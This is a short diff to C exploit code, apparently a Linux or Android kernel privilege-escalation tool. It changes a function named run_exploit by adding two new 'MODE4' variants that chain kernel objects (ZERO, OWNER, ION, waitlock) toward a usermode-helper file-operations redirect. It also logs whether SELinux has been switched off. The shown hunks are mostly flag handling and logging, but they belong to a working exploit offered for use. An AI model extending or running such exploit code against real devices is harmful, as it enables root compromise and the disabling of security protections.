@@ -847,17 +847,24 @@ int run_exploit(int argc, char **argv) {
     int chain = env_flag("MODE4_CHAIN", 0);
     int zion = env_flag("MODE4_ZION", 0);
     int zi = env_flag("MODE4_ZI", 0);
+    int wion = env_flag("MODE4_WION", 0);
+    int zio = env_flag("MODE4_ZIO", 0);
     int pad3 = env_flag("MODE4_PAD3", 0);
     pr_info("UMH path: fops redirect (mode=4)%s...\n",
             pad3 ? " MODE4_PAD3 pad→*MISC"
-                 : (zi ? " MODE4_ZI ZERO→ION"
-                       : (zion ? " MODE4_ZION NAME0→ION"
-                               : (chain ? " MODE4_CHAIN ZERO→OWNER→ION" : ""))));
+                 : (zio ? " MODE4_ZIO ZERO→OWNER→ION"
+                        : (wion ? " MODE4_WION waitlock0→ION"
+                                : (zi ? " MODE4_ZI ZERO→ION"
+                                      : (zion ? " MODE4_ZION NAME0→ION"
+                                              : (chain ? " MODE4_CHAIN ZERO→OWNER→ION"
+                                                       : ""))))));
     live_sync_log("MAIN", pad3 ? "umh_pad3_start"
-                               : (zi ? "umh_zi_start"
-                                     : (zion ? "umh_zion_start"
-                                             : (chain ? "umh_chain_start"
-                                                      : "umh_mode4_start"))));
+                               : (zio ? "umh_zio_start"
+                                      : (wion ? "umh_wion_start"
+                                              : (zi ? "umh_zi_start"
+                                                    : (zion ? "umh_zion_start"
+                                                            : (chain ? "umh_chain_start"
+                                                                     : "umh_mode4_start"))))));
     {
       char b[96];
       read_first_line("/proc/sys/kernel/random/boot_id", b, sizeof(b));
@@ -875,8 +882,9 @@ int run_exploit(int argc, char **argv) {
     live_sync_log("MAIN", "umh_mode4_done");
     selinux_ok = check_selinux_off();
     /* CPH isolation: stop after mode4/chain (Write1 packing softboots). */
-    if (env_flag("MODE4_ONLY", 0) || chain || zion || zi || pad3) {
-      pr_info("MODE4_ONLY/CHAIN/ZION/ZI/PAD3 stop after fops (cfi step=%d errno=%d wr=%zd)\n",
+    if (env_flag("MODE4_ONLY", 0) || chain || zion || zi || wion || zio ||
+        pad3) {
+      pr_info("MODE4_ONLY/.../ZIO stop after fops (cfi step=%d errno=%d wr=%zd)\n",
               cfi_last_step, cfi_last_errno, cfi_write_ret);
       live_sync_log("MAIN", "stop_no_w1");
       return (cfi_last_step == 0 && cfi_dirty_seen) || cfi_write_ret > 0 ? 0 : 1;
